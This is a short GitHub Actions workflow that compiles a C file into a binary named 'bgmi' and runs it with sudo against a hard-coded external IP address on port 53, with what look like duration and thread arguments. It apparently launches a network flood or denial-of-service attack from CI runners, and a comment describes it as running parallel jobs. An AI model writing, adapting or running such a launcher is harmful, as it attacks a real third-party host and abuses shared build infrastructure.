name: Parallel C Run

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        job_id: [1]  # 👈 5 parallel jobs

    steps:
    - name: Checkout repo
      uses: actions/checkout@v4

    - name: Install dependencies
      run: sudo apt update && sudo apt install -y gcc zlib1g-dev

    - name: Compile
      run: gcc -o bgmi test.c -lpthread -lz

    - name: Run program
      run: |
        echo "Running job ${{ matrix.job_id }}"
        sudo ./bgmi 147.75.202.235 53 10 -1 30
